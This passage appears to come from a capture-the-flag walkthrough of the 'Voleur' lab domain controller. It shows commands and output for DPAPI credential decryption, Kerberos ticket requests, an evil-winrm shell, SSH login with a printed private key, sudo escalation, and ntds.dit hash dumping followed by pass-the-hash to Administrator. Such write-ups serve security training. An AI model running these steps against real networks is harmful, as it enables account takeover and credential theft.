-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88                                 

PS C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110> copy 08949382-134f-4c63-b93c-ce52efc0aa88 n:\\
```

Decrypt the content and get new creds

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid 'S-1-5-21-3927696377-1337352550-2781715495-1110' 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Password:
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

jeremy.combs:qT3V9pLXyN7W4m

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FasjAqy9eliVQ0q9FxAei%2Fimage.png?alt=media&#x26;token=0b1c080b-313b-42e9-8cb7-cbb5d4a36c4e" alt=""><figcaption></figcaption></figure>

Create a ticket for him

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-getTGT 'voleur.htb/jeremy.combs' -dc-ip 10.10.11.76
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in jeremy.combs.ccache

┌──(kali㉿kali)-[~/Downloads]
└─$ export KRB5CCNAME=jeremy.combs.ccache         
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ klist 
Ticket cache: FILE:jeremy.combs.ccache
Default principal: jeremy.combs@VOLEUR.HTB

Valid starting       Expires              Service principal
09/26/2025 03:40:44  09/26/2025 13:40:44  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/27/2025 03:38:05
```

Login with winrm

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
```

Go to C:\IT\Third-Line Support

```bash
*Evil-WinRM* PS C:\\IT\\Third-Line Support> ls 

    Directory: C:\\IT\\Third-Line Support

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt
```

We find a note saying to use WSL

```bash
*Evil-WinRM* PS C:\\IT\\Third-Line Support> cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

We also get a private key

```bash
*Evil-WinRM* PS C:\\IT\\Third-Line Support> cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Log in as ssh is open on port 22

```bash
 ┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -p 2222 svc_backup@voleur.htb -i id_rsa
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
```

We can become root

```bash
svc_backup@DC:~$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
svc_backup@DC:~$ su root
Password: 
svc_backup@DC:~$ sudo su root
root@DC:/home/svc_backup#
```

The file system is mounted on /mnt and the backup folder contains ntds.dit and SYSTEM

```bash
root@DC:/home# cd /mnt 
root@DC:/mnt# ls 
c
root@DC:/mnt# cd c
root@DC:/mnt/c# ls 
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'   Config.Msi                DumpStack.log.tmp   HR   PerfLogs        'Program Files (x86)'   Recovery                     Users     inetpub
'$WinREAgent'   'Documents and Settings'   Finance             IT  'Program Files'   ProgramData           'System Volume Information'   Windows   pagefile.sys
root@DC:/mnt/c# cd IT
root@DC:/mnt/c/IT# ls 
'First-Line Support'  'Second-Line Support'  'Third-Line Support'
root@DC:/mnt/c/IT# cd Third-Line\\ Support/
root@DC:/mnt/c/IT/Third-Line Support# ls 
Backups  Note.txt.txt  id_rsa
root@DC:/mnt/c/IT/Third-Line Support# cd Backups/
root@DC:/mnt/c/IT/Third-Line Support/Backups# ls 
'Active Directory'   registry
root@DC:/mnt/c/
IT/Third-Line Support/Backups# cd Active\\ Directory/
root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# ls 
ntds.dit  ntds.jfm
root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# cd ..
root@DC:/mnt/c/IT/Third-Line Support/Backups# cd registry/
root@DC:/mnt/c/IT/Third-Line Support/Backups/registry# ls 
SECURITY  SYSTEM
root@DC:/mnt/c/IT/Third-Line Support/Backups/registry#
```

Transfer the files

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ scp -P 2222 -i id_rsa svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY .
scp: /mnt/c/IT/Third-Line: No such file or directory
cp: cannot stat 'Support/Backups/registry/SECURITY': No such file or directory
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ scp -P 2222 -i id_rsa svc_backup@voleur.htb:/mnt/c/IT/'Third-Line Support'/Backups/registry/SECURITY .
SECURITY                                                                                                                                                                                                  100%   32KB 278.3KB/s   00:00    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ scp -P 2222 -i id_rsa svc_backup@voleur.htb:/mnt/c/IT/'Third-Line Support'/Backups/registry/SYSTEM .  
SYSTEM                                                                                                                                                                                                    100%   18MB   2.1MB/s   00:08    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ scp -P 2222 -i id_rsa svc_backup@voleur.htb:/mnt/c/IT/'Third-Line Support'/Backups/'Active Directory'/ntds.dit .
ntds.dit
```

Dump the hashes

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

Create a ticket, login and get the flag

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-getTGT 'voleur.htb/Administrator' -dc-ip 10.10.11.76 -hashes :e656e07c56d831611b577b160b259ad2                            
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ export KRB5CCNAME=Administrator.ccache 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ klist 
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@VOLEUR.HTB

Valid starting       Expires              Service principal
09/26/2025 03:57:43  09/26/2025 13:57:43  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/27/2025 03:53:22
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
```
